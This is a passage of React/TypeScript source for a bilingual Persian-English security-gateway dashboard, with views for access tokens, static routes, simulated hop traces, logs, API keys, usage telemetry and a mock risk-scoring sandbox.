                    </form>
                  </div>

                  {/* Registered Credentials Table */}
                  <div className="xl:col-span-7 bg-slate-950 border border-slate-900 rounded-xl overflow-hidden flex flex-col justify-between">
                    <div className="p-4 border-b border-slate-900 bg-[#080c16]">
                      <h4 className="text-white font-bold text-xs">{isRtl ? "کارنامه توکن‌های دسترسی معتبر" : "Authorized Cryptographic Credentials System Ledger"}</h4>
                      <p className="text-[10px] text-slate-500 mt-0.5">{isRtl ? "لیست کلیدهای مجاز برای برقراری ارتباط با گیت‌وی" : "Keys currently valid to authenticate with security gateway."}</p>
                    </div>

                    <div className="flex-1 overflow-x-auto min-h-[220px]">
                      <table className="w-full text-right ltr:text-left font-mono text-[11px]">
                        <thead>
                          <tr className="bg-[#0c1224] text-slate-500 uppercase text-[9px] border-b border-slate-900 select-none">
                            <th className="p-2.5 text-right">{isRtl ? "برنامه کلاینت" : "Client Application"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "مدل دسترسی" : "Crypto Type / Alg"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "کلید وب‌سرویس" : "Auth token Key"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "سطح دسترسی" : "Perm Level"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "تاریخ تعریف" : "Created At"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "وضعیت کلید" : "Credentials Status"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "لغو" : "Revoke"}</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-900">
                          {tokensList.map((tk) => (
                            <tr key={tk.id} className={cn("hover:bg-[#080d1a] transition-all", tk.status === "revoked" && "opacity-40 bg-rose-500/[0.01]")}>
                              <td className="p-2.5 font-sans font-bold text-white shrink-0">{tk.client}</td>
                              <td className="p-2.5 text-center"><span className="text-indigo-400 font-bold uppercase">{tk.type}</span> {tk.algo}</td>
                              <td className="p-2.5 text-center">
                                <span className="bg-slate-900 border border-slate-800 text-slate-300 text-[10px] px-1.5 py-0.5 rounded select-all select-none">
                                  {tk.key}
                                </span>
                              </td>
                              <td className="p-2.5 text-center text-slate-400 font-sans font-medium text-[10px]">{tk.clearance}</td>
                              <td className="p-2.5 text-center text-slate-500 text-[10px]">{tk.created}</td>
                              <td className="p-2.5 text-center">
                                <span className={cn(
                                  "px-1 text-[9px] font-bold py-0.5 rounded uppercase border",
                                  tk.status === "active" ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" : "bg-rose-500/10 text-rose-400 border-rose-500/20"
                                )}>
                                  {tk.status === "active" ? (isRtl ? "مجاز" : "ACTIVE") : (isRtl ? "لغو شده" : "REVOKED")}
                                </span>
                              </td>
                              <td className="p-2.5 text-center">
                                <div className="flex justify-center items-center gap-1">
                                  <button
                                    onClick={() => handleToggleToken(tk.id)}
                                    className={cn(
                                      "px-1.5 py-0.5 text-[9px] font-bold rounded cursor-pointer",
                                      tk.status === "active" ? "bg-rose-500/10 hover:bg-rose-500/20 text-rose-400" : "bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400"
                                    )}
                                  >
                                    {tk.status === "active" ? (isRtl ? "ابطال" : "Revoke") : (isRtl ? "احیا" : "Activate")}
                                  </button>
                                  <button
                                    onClick={() => handleDeleteToken(tk.id)}
                                    className="p-1 text-slate-500 hover:text-rose-400 cursor-pointer transition-all"
                                  >
                                    <Trash2 className="w-3 h-3" />
                                  </button>
                                </div>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* SUBTAB 3: SYSTEM ROUTING OPERATIONS */}
            {auditLogsSubTab === "routing" && (
              <div className="space-y-6">
                <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
                  {/* Routing Trace diagnostic tester */}
                  <div className="xl:col-span-5 space-y-4">
                    {/* Add static route Form */}
                    <div className="bg-slate-950 border border-slate-900 p-5 rounded-xl space-y-4">
                      <div>
                        <h4 className="text-white font-bold text-xs flex items-center gap-1 text-right">
                          <Route className="w-4 h-4 text-amber-500" />
                          {isRtl ? "افزودن مسیر ارتباطی ایستاتیک (Add Static Route)" : "Inject Static Subnet Route"}
                        </h4>
                        <p className="text-[10px] text-slate-500 mt-1">{isRtl ? "هدایت ترافیکی بسته‌ها به سمت رکوردهای خاص" : "Optimize dynamic destination subnets through custom interface pools."}</p>
                      </div>

                      <form onSubmit={handleAddRoute} className="space-y-4 font-mono text-xs text-left">
                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "آدرس گیت‌وی سابنت هدف" : "Destination Subnet / CIDR"}</label>
                          <input
                            type="text"
                            required
                            value={routeDest}
                            onChange={(e) => setRouteDest(e.target.value)}
                            placeholder="e.g. 10.220.0.0/16"
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-amber-500"
                          />
                        </div>

                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "آدرس آی‌پی روتر گت‌وی" : "Gateway Router IP"}</label>
                          <input
                            type="text"
                            required
                            value={routeGw}
                            onChange={(e) => setRouteGw(e.target.value)}
                            placeholder="e.g. 10.220.0.1"
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-amber-500"
                          />
                        </div>

                        <div className="grid grid-cols-3 gap-2">
                          <div className="space-y-1 col-span-2">
                            <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "کارت فیزیکی شبکه" : "Adapter Int"}</label>
                            <select
                              value={routeIface}
                              onChange={(e: any) => setRouteIface(e.target.value)}
                              className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-amber-500"
                            >
                              <option value="eth0">eth0 (WAN Adaptor)</option>
                              <option value="wg0">wg0 (WireGuard tunnel)</option>
                              <option value="eth1">eth1 (Local DMZ)</option>
                              <option value="lo">lo (Local Virtual)</option>
                            </select>
                          </div>

                          <div className="space-y-1">
                            <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "متریک" : "Metric"}</label>
                            <input
                              type="number"
                              value={routeMetric}
                              onChange={(e) => setRouteMetric(Number(e.target.value) || 1)}
                              className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-amber-500"
                            />
                          </div>
                        </div>

                        <button
                          type="submit"
                          className="w-full py-2 bg-gradient-to-r from-amber-600 to-amber-700 hover:from-amber-500 hover:to-amber-600 text-white font-extrabold text-xs uppercase tracking-wider rounded-lg transition-all cursor-pointer border border-amber-500/20"
                        >
                          {isRtl ? "مسیریابی مجدد ترافیک شبکه" : "COMMIT STATIC PATH DEVIATION"}
                        </button>
                      </form>
                    </div>

                    {/* Interactive path tracing diagnostics */}
                    <div className="bg-slate-950 border border-slate-900 p-5 rounded-xl space-y-4">
                      <div>
                        <h4 className="text-white font-bold text-xs flex items-center gap-1">
                          <Activity className="w-4 h-4 text-cyan-400" />
                          {isRtl ? "تست لایو مسیر روتینگ کلاینت (Route Path Trace)" : "Interactive Hop Trace Diagnostics"}
                        </h4>
                        <p className="text-[10px] text-slate-500 mt-1">{isRtl ? "بررسی لتنسی و گپ بسته‌های شبکه تا مقصد تعیین شده" : "Run sequence check to verify target routing health instantly."}</p>
                      </div>

                      <div className="flex gap-2 font-mono">
                        <input
                          type="text"
                          value={routePingIp}
                          onChange={(e) => setRoutePingIp(e.target.value)}
                          placeholder="Host e.g. 8.8.8.8"
                          className="flex-1 bg-[#0c1224] border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-500 text-left font-mono"
                        />
                        <button
                          onClick={handleRunPingDiagnostic}
                          disabled={routePingRunning}
                          className="px-4 py-1.5 bg-cyan-500/10 hover:bg-cyan-500/25 border border-cyan-500/20 text-cyan-400 hover:text-cyan-300 text-xs font-bold rounded-lg cursor-pointer transition-all flex items-center gap-1 uppercase shrink-0"
                        >
                          <Play className={cn("w-3 h-3", routePingRunning && "animate-spin")} />
                          {routePingRunning ? (isRtl ? "درحال بررسی..." : "RUNNING...") : (isRtl ? "شبیه‌سازی مسیر" : "TRACE NOW")}
                        </button>
                      </div>

                      {routePingLog.length > 0 && (
                        <div className="bg-slate-950 border border-slate-900 rounded-lg p-4 h-44 overflow-y-auto font-mono text-[10px] text-cyan-400 space-y-1 text-left select-all custom-scrollbar uppercase">
                          {routePingLog.map((logStr, idx) => (
                            <div key={idx} className="border-b border-cyan-950/20 pb-0.5 last:border-0 last:text-emerald-400 font-bold">
                              <span className="text-slate-600 cursor-none select-none">[{idx + 1}]</span> {logStr}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Active routing matrix static routing table */}
                  <div className="xl:col-span-7 bg-slate-950 border border-slate-900 rounded-xl overflow-hidden flex flex-col justify-between">
                    <div className="p-4 border-b border-slate-900 bg-[#080c16]">
                      <h4 className="text-white font-bold text-xs">{isRtl ? "توزیع کانکشن‌ها و جدول فعال روتینگ هسته" : "Active System IP Routing Gateway Hub Matrix"}</h4>
                      <p className="text-[10px] text-slate-500 mt-0.5">{isRtl ? "کانال‌های فرعی و اولویت‌بندی متریک شبکه‌ها" : "Physical networking adapters processing live client requests."}</p>
                    </div>

                    <div className="flex-1 overflow-x-auto min-h-[300px]">
                      <table className="w-full text-right ltr:text-left font-mono text-[11px]">
                        <thead>
                          <tr className="bg-[#0c1224] text-slate-500 uppercase text-[9px] border-b border-slate-900 select-none">
                            <th className="p-2.5 text-right">{isRtl ? "آدرس سابنت مقصد (Network)" : "Destination Subnet"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "آی‌پی گت‌وی" : "Gateway Router IP"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "کارت شبکه" : "Dev Adapter"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "متریک" : "Metric"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "اولویت" : "Priority"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "وضعیت اتصال" : "Health"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "عمل" : "Purge"}</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-900">
                          {routesList.map((rt) => (
                            <tr key={rt.id} className="hover:bg-[#080d1a] transition-all">
                              <td className="p-2.5 font-sans font-bold text-white shrink-0 font-mono select-all text-right ltr:text-left">{rt.destination}</td>
                              <td className="p-2.5 text-center text-indigo-400 font-bold font-mono">{rt.gateway === "0.0.0.0" ? (isRtl ? "بدون گت‌وی (Direct)" : "Direct Adapter") : rt.gateway}</td>
                              <td className="p-2.5 text-center font-mono text-slate-400"><span className="bg-[#0b0f19] text-amber-500 font-bold px-1.5 py-0.5 rounded border border-slate-850">{rt.interface}</span></td>
                              <td className="p-2.5 text-center text-slate-400 font-sans font-medium text-[10px]">{rt.metric}</td>
                              <td className="p-2.5 text-center">
                                <span className={cn(
                                  "text-[9px] font-bold uppercase",
                                  rt.priority === "high" ? "text-rose-400" : "text-slate-400"
                                )}>
                                  {rt.priority.toUpperCase()}
                                </span>
                              </td>
                              <td className="p-2.5 text-center">
                                <span className="flex justify-center items-center gap-1 select-none">
                                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                                  <span className="text-[9px] font-extrabold text-emerald-400 uppercase">ONLINE</span>
                                </span>
                              </td>
                              <td className="p-2.5 text-center">
                                {rt.destination !== "0.0.0.0/0" ? (
                                  <button
                                    onClick={() => handleDeleteRoute(rt.id)}
                                    className="p-1 text-slate-500 hover:text-rose-400 cursor-pointer transition-all"
                                  >
                                    <Trash2 className="w-3.5 h-3.5" />
                                  </button>
                                ) : (
                                  <span className="text-slate-600 text-[9px] cursor-not-allowed select-none">{isRtl ? "قفل" : "LOCK"}</span>
                                )}
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* UNIFIED COMPREHENSIVE SECURITY KERNEL LOGGER TERMINAL */}
        <div className="bg-slate-950 border border-dash-border rounded-xl p-5 flex flex-col h-[400px] overflow-hidden">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-slate-900 pb-3 mb-3 gap-3">
            <span className="text-xs font-mono font-bold text-indigo-400 uppercase flex items-center gap-2">
              <Terminal className="w-3.5 h-3.5 text-indigo-400" />
              [SECURITY LOGGER RUNNING ON ADMIN SOCKET - CRYPTOGRAPHIC INTEGRITY MATCH SAFE]
            </span>
            
            <input
              type="text"
              value={auditLogsSearch}
              onChange={(e) => setAuditLogsSearch(e.target.value)}
              placeholder={isRtl ? "جستجو آنی در لاگ‌های هسته..." : "Grep console outputs..."}
              className="bg-slate-900 border border-slate-800 rounded-lg px-2.5 py-1 text-[11px] text-slate-300 w-full sm:w-60 placeholder-slate-600 font-mono text-left"
            />
          </div>

          <div className="flex-1 overflow-y-auto custom-scrollbar font-mono text-[11px] leading-relaxed space-y-2 text-left">
            {filteredLogs.map((log) => (
              <div key={log.id} className={cn("pb-1.5 border-b border-slate-900/40 last:border-0 flex items-start select-all leading-normal", log.color)}>
                <span className="text-slate-600 mr-2 shrink-0 select-none font-mono">[{log.time}]</span>
                <span className="bg-[#070b13] text-indigo-400 text-[9px] font-bold px-1.5 py-0.5 rounded mr-2 uppercase border border-slate-900 shrink-0">
                  {log.type}
                </span>
                <span className="break-all font-mono">{log.text}</span>
              </div>
            ))}
            {filteredLogs.length === 0 && (
              <div className="py-12 text-center text-slate-600 font-mono">
                {isRtl ? "[پایگاه داده لاگ‌ها خالی است یا نتیجه‌ای یافت نشد]" : "[No records matches active console search filters]"}
              </div>
            )}
          </div>

          <div className="border-t border-slate-900 pt-3 mt-3">
            <form onSubmit={handleInjectNoteLog} className="flex gap-2">
              <input
                type="text"
                value={customAuditNote}
                onChange={(e) => setCustomAuditNote(e.target.value)}
                placeholder={isRtl ? "درج یادداشت دستی ادمین در تاریخچه لجر..." : "Write manual administrative patch verification to cryptographic ledger..."}
                className="flex-1 bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-indigo-500 placeholder-slate-600"
              />
              <button
                type="submit"
                className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-xs uppercase tracking-wider rounded-lg transition-all cursor-pointer whitespace-nowrap shrink-0"
              >
                {isRtl ? "درج یادداشت لجر" : "INJECT RECORD"}
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // 6.1) SUBVIEW: DEVELOPER API KEYS
  if (activeTab === "apiKeys") {
    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="border-b border-dash-border/40 pb-4">
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Lock className="w-5 h-5 text-indigo-400" />
            {isRtl ? "مدیریت کلیدهای امنیتی و توکن‌های API" : "Secure API Gateway Cryptographic Keys"}
          </h2>
          <p className="text-xs text-slate-500 mt-1">
            {isRtl 
              ? "کلیدهای صادر شده برای ارتباط بیرونی سیستم و دسترسی به موتور ریسک کدهای اختصاصی" 
              : "Generate and authorize programmatic API keys for third-party servers integrations."}
          </p>
        </div>

        {apiKeySuccessMsg && (
          <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4 animate-bounce" />
            {apiKeySuccessMsg}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-sm font-semibold text-slate-200">
                {isRtl ? "صدور کلید ادمین جدید" : "Issue New Credentials Token"}
              </h3>
              <form onSubmit={handleGenerateKey} className="space-y-4">
                <div className="space-y-1">
                  <label className="text-xs text-slate-400 tracking-wide">
                    {isRtl ? "نام و عنوان شناسه کلید کاربری" : "Identify Account / Description"}
                  </label>
                  <input
                    type="text"
                    value={newKeyName}
                    onChange={(e) => setNewKeyName(e.target.value)}
                    placeholder="e.g. Threat API Server Integration"
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-100 placeholder-slate-600 focus:outline-none focus:border-indigo-500"
                  />
                </div>
                <button
                  type="submit"
                  className="w-full py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-xs uppercase tracking-wider rounded-lg transition-all shadow-[0_0_12px_rgba(79,70,229,0.4)] cursor-pointer"
                >
                  {isRtl ? "تولید کلید امنیتی" : "GENERATE PASS KEY"}
                </button>
              </form>
            </div>
          </div>

          <div className="lg:col-span-8">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5">
              <h3 className="text-sm font-semibold text-slate-200 mb-4">
                {isRtl ? "لیست کلیدهای فعال توسعه‌دهندگان" : "Active Cryptographic API Keys"}
              </h3>

              <div className="space-y-4">
                {apiKeyList.map((keyObj) => (
                  <div key={keyObj.id} className="p-3 rounded-lg border border-dash-border/60 bg-[#06080e] flex items-center justify-between gap-3 text-xs">
                    <div className="flex-1 min-w-0 pr-2 space-y-1">
                      <div className="font-bold text-slate-200 truncate">{keyObj.name}</div>
                      <div className="text-[10px] text-slate-500">
                        {isRtl ? `صادرشده در: ${keyObj.created} • سطح:` : `Issued on: ${keyObj.created} • Scope:`} {keyObj.scope}
                      </div>
                      <div className="flex items-center gap-2 pt-1 font-mono text-[10px] text-indigo-400">
                        <code>{keyObj.token}</code>
                        <button 
                          onClick={() => {
                            navigator.clipboard.writeText(keyObj.token);
                            setApiKeySuccessMsg(isRtl ? "کپی شد" : "Token copied to clipboard!");
                            setTimeout(() => setApiKeySuccessMsg(""), 2000);
                          }}
                          className="text-slate-500 hover:text-slate-300 cursor-pointer"
                          title="Copy Key Token"
                        >
                          <Copy className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                    <div>
                      <button
                        onClick={() => handleRevokeKey(keyObj.id)}
                        className="p-1 px-2 text-[10px] uppercase font-mono font-bold hover:bg-rose-500/10 text-rose-400 rounded-lg border border-rose-500/20 cursor-pointer"
                      >
                        {isRtl ? "ابطال کلید" : "REVOKE"}
                      </button>
                    </div>
                  </div>
                ))}
                {apiKeyList.length === 0 && (
                  <div className="py-8 text-center text-slate-500 font-mono">
                    {isRtl ? "[هیچ کلید فعالی صادر نشده است]" : "[No active credentials registers]"}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // 6.2) SUBVIEW: API USAGE
  if (activeTab === "apiUsage") {
    const handleSimulateApiSpike = () => {
      setApiRequestsChart(prev => prev.map(timeData => {
        const spikeMultiplier = 1.3 + Math.random() * 0.9;
        const errorPercent = parseFloat((0.2 + Math.random() * 2.5).toFixed(1));
        return {
          ...timeData,
          requests: Math.floor(timeData.requests * spikeMultiplier),
          latency: Math.floor(timeData.latency * (0.9 + Math.random() * 0.4)),
          errorRate: errorPercent,
        };
      }));

      setApiUsageSuccessMsg(
        isRtl 
          ? "ترافیک ناگهانی (Spike) شبیه‌سازی شد! متغیرهای فایروال گیت‌وی لایو آپدیت شدند." 
          : "API Traffic spike simulated! Visual telemetry nodes updated in real-time."
      );
      setTimeout(() => setApiUsageSuccessMsg(""), 3500);
    };

    const apiEndpoints = [
      { path: "/api/v1/decision/evaluate", method: "POST", desc: "استعلام ریسک هوشمند", descEn: "Smart Risk Evaluation", calls: "6,412,980", avgTime: "82ms", health: "99.9%" },
      { path: "/api/v1/fingerprint/verify", method: "POST", desc: "تایید اثرانگشت مرورگر", descEn: "Session Fingerprint Verify", calls: "4,110,402", avgTime: "45ms", health: "100%" },
      { path: "/api/v1/threat/ip-check", method: "GET", desc: "استعلام سریع آی‌پی مخرب", descEn: "Quick IP Threat Query", calls: "1,520,110", avgTime: "24ms", health: "99.8%" },
      { path: "/api/v1/behavior/cadence", method: "POST", desc: "بررسی پویای موتور رفتاری", descEn: "Submit Behavioral Cadence", calls: "372,400", avgTime: "110ms", health: "98.5%" },
    ];

    const totalCalculatedCalls = apiRequestsChart.reduce((acc, curr) => acc + curr.requests, 0);

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <BarChart2 className="w-5 h-5 text-indigo-400" />
              {isRtl ? "پایش عملکرد و میزان مصرف توکن‌های API" : "Programmatic API Usage Telemetry"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "ارزیابی زنده تعداد درخواست‌ها به آدرس‌های فایروال سایبری و آمار کدهای پاسخ ادمین" 
                : "Continuous latency metrics, hourly requests load, and gateway response-status ratios."}
            </p>
          </div>
          <button
            onClick={handleSimulateApiSpike}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 self-start cursor-pointer transition-all shadow-[0_0_12px_rgba(79,70,229,0.3)] animate-pulse"
          >
            <Zap className="w-3.5 h-3.5" />
            {isRtl ? "شبیه‌سازی پیک ترافیک بیرونی" : "Simulate Live API Spike"}
          </button>
        </div>

        {apiUsageSuccessMsg && (
          <div className="p-3 bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {apiUsageSuccessMsg}
          </div>
        )}

        {/* Info Grid */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-dash-panel border border-dash-border p-4 rounded-xl text-right ltr:text-left">
            <span className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "مجموع درخواست‌ها (بازه زمانی)" : "AGGREGATED SAMPLES"}</span>
            <span className="text-lg font-bold text-white block mt-1 font-mono">{(totalCalculatedCalls * 15).toLocaleString()}</span>
          </div>
          <div className="bg-dash-panel border border-dash-border p-4 rounded-xl text-right ltr:text-left">
            <span className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "میانگین تاخیر گیت‌وی" : "GATEWAY LATENCY"}</span>
            <span className="text-lg font-bold text-slate-200 block mt-1 font-mono">
              {Math.floor(apiRequestsChart.reduce((acc, c) => acc + c.latency, 0) / apiRequestsChart.length)} ms
            </span>
          </div>
          <div className="bg-dash-panel border border-dash-border p-4 rounded-xl text-right ltr:text-left">
            <span className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "ضریب سلامت هدرها" : "CACHE HIT RATIO"}</span>
            <span className="text-lg font-bold text-emerald-400 block mt-1 font-mono">88.4%</span>
          </div>
          <div className="bg-dash-panel border border-dash-border p-4 rounded-xl text-right ltr:text-left">
            <span className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "ضریب خطاهای سیستمی" : "ERR RATIO"}</span>
            <span className="text-lg font-bold text-amber-500 block mt-1 font-mono">
              {(apiRequestsChart.reduce((acc, c) => acc + c.errorRate, 0) / apiRequestsChart.length).toFixed(1)}%
            </span>
          </div>
        </div>

        {/* Charts block */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-8 bg-dash-panel border border-dash-border rounded-xl p-5">
            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">
              {isRtl ? "حجم درخواست پایگاه داده API در ۲۴ ساعت گذشته" : "API Query Load Sequence (Hourly Aggregates)"}
            </h3>
            <div className="w-full h-64 bg-slate-950/60 rounded-lg p-2 border border-slate-900">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={apiRequestsChart}>
                  <defs>
                    <linearGradient id="colorRequests" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#6366f1" stopOpacity={0.3}/>
                      <stop offset="95%" stopColor="#6366f1" stopOpacity={0}/>
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="#161b22" />
                  <XAxis dataKey="hour" stroke="#475569" fontSize={10} />
                  <YAxis stroke="#475569" fontSize={10} />
                  <Tooltip contentStyle={{ backgroundColor: "#06080c", color: "#fff", border: "0" }} />
                  <Area type="monotone" dataKey="requests" stroke="#6366f1" fillOpacity={1} fill="url(#colorRequests)" strokeWidth={2} />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

          <div className="lg:col-span-4 bg-dash-panel border border-dash-border rounded-xl p-5 flex flex-col justify-between">
            <div>
              <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">
                {isRtl ? "توزیع کدهای پاسخ HTTP فایروال" : "HTTP Response Code Metrics"}
              </h3>
              
              <div className="space-y-3">
                <div>
                  <div className="flex justify-between text-xs mb-1">
                    <span className="font-mono text-emerald-400">200 OK</span>
                    <span className="text-slate-400">97.8%</span>
                  </div>
                  <div className="h-2 w-full bg-slate-900 border border-slate-800 rounded-full overflow-hidden">
                    <div className="bg-emerald-500 h-full rounded-full" style={{ width: "97.8%" }} />
                  </div>
                </div>

                <div>
                  <div className="flex justify-between text-xs mb-1">
                    <span className="font-mono text-amber-500">429 RateLimit</span>
                    <span className="text-slate-400">1.6%</span>
                  </div>
                  <div className="h-2 w-full bg-slate-900 border border-slate-800 rounded-full overflow-hidden">
                    <div className="bg-amber-500 h-full rounded-full" style={{ width: "1.6%" }} />
                  </div>
                </div>

                <div>
                  <div className="flex justify-between text-xs mb-1">
                    <span className="font-mono text-rose-500">403 Forbidden</span>
                    <span className="text-slate-400">0.5%</span>
                  </div>
                  <div className="h-2 w-full bg-slate-900 border border-slate-800 rounded-full overflow-hidden">
                    <div className="bg-rose-500 h-full rounded-full" style={{ width: "0.5%" }} />
                  </div>
                </div>

                <div>
                  <div className="flex justify-between text-xs mb-1">
                    <span className="font-mono text-indigo-500">500 Server Err</span>
                    <span className="text-slate-400">0.1%</span>
                  </div>
                  <div className="h-2 w-full bg-slate-900 border border-slate-800 rounded-full overflow-hidden">
                    <div className="bg-indigo-500 h-full rounded-full" style={{ width: "0.1%" }} />
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-slate-950 p-3 rounded-lg border border-slate-900 text-[10px] text-slate-500 leading-normal mt-4">
              {isRtl 
                ? "💡 موتور توزیع هوشمند به طور خودکار به کلاینت‌هایی که بازوی پایش آنها مشکوک تشخیص داده شوند کد خطا ۴۲۹ اعمال می‌کند."
                : "💡 Standard status codes are managed autonomously. Suspicious headless bots are isolated with standard 429 penalties on active domains."}
            </div>
          </div>
        </div>

        {/* Endpoints Table Grid */}
        <div className="bg-dash-panel border border-dash-border rounded-xl p-5">
          <h3 className="text-sm font-semibold text-slate-200 mb-4">
            {isRtl ? "پایانه‌های فعال متصل به گیت‌وی احراز امنیتی" : "Active Programmatic Firewall Endpoints"}
          </h3>

          <div className="overflow-x-auto">
            <table className="w-full text-left ltr:text-left rtl:text-right text-xs">
              <thead>
                <tr className="text-slate-500 uppercase font-bold border-b border-dash-border/60 pb-3">
                  <th className="pb-3">{isRtl ? "آدرس وب سرویس" : "Endpoint Path"}</th>
                  <th className="pb-3">{isRtl ? "متد ترافیکی" : "Method"}</th>
                  <th className="pb-3">{isRtl ? "عملکرد" : "Service Action"}</th>
                  <th className="pb-3">{isRtl ? "تعداد کوئری‌ها" : "Hits Total"}</th>
                  <th className="pb-3">{isRtl ? "میانگین سرعت پاسخ" : "Avg Response Time"}</th>
                  <th className="pb-3">{isRtl ? "ضریب پایداری" : "Uptime Status"}</th>
                </tr>
              </thead>
              <tbody className="text-indigo-200 divide-y divide-dash-border/40 font-medium">
                {apiEndpoints.map((ep, i) => (
                  <tr key={i} className="hover:bg-slate-800/10">
                    <td className="py-3 font-mono font-bold text-white">{ep.path}</td>
                    <td className="py-3">
                      <span className={cn(
                        "px-1.5 py-0.5 rounded text-[9px] font-bold font-mono",
                        ep.method === "POST" ? "bg-emerald-500/15 text-emerald-400" : "bg-indigo-500/15 text-indigo-400"
                      )}>
                        {ep.method}
                      </span>
                    </td>
                    <td className="py-3 text-slate-400">{isRtl ? ep.desc : ep.descEn}</td>
                    <td className="py-3 font-mono text-xs text-slate-350">{ep.calls}</td>
                    <td className="py-3 font-mono text-indigo-400">{ep.avgTime}</td>
                    <td className="py-3 text-emerald-400 font-bold">● {ep.health}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    );
  }

  // 6.3) SUBVIEW: INTERACTIVE DOCUMENTATION & PLAYGROUND
  if (activeTab === "documentation") {
    const handleRunSandboxQuery = (e: React.FormEvent) => {
      e.preventDefault();
      setSandboxIsTesting(true);
      setSandboxResponse(null);

      // Simulate network verification lag of 1100ms
      setTimeout(() => {
        let score = 4;
        let dec = "APPROVED";
        let scoreDesc = "Safe endpoint request";
        let scoreDescFa = "دستگاه کاملاً پاک و با اعتماد بالا";

        if (sandboxDocEndpoint === "verify") {
          score = 12;
          dec = "APPROVED_BY_FINGERPRINT";
          scoreDesc = "Stable browser profile registry match";
          scoreDescFa = "مشخصات مرورگر کلاینت ثبت و مورد اعتماد است";
        } else if (sandboxDocEndpoint === "ip-check") {
          if (sandboxInputIp === "185.190.140.10") {
            score = 38;
            dec = "ROUTING_VERIFIED";
            scoreDesc = "Standard subscriber IP. Minimal latency";
            scoreDescFa = "ترافیک اینترنت خانگی مجاز. ریسک پایین";
          } else {
            score = 74;
            dec = "CHALLENGED";
            scoreDesc = "Residential server tunnel. VPN detection match";
            scoreDescFa = "ترافیک تجاری VPN یا پروکسی سرور شناسایی شد";
          }
        } else {
          // evaluate
          if (sandboxInputDevice.toLowerCase().includes("bot") || sandboxInputDevice.toLowerCase().includes("headless")) {
            score = 96;
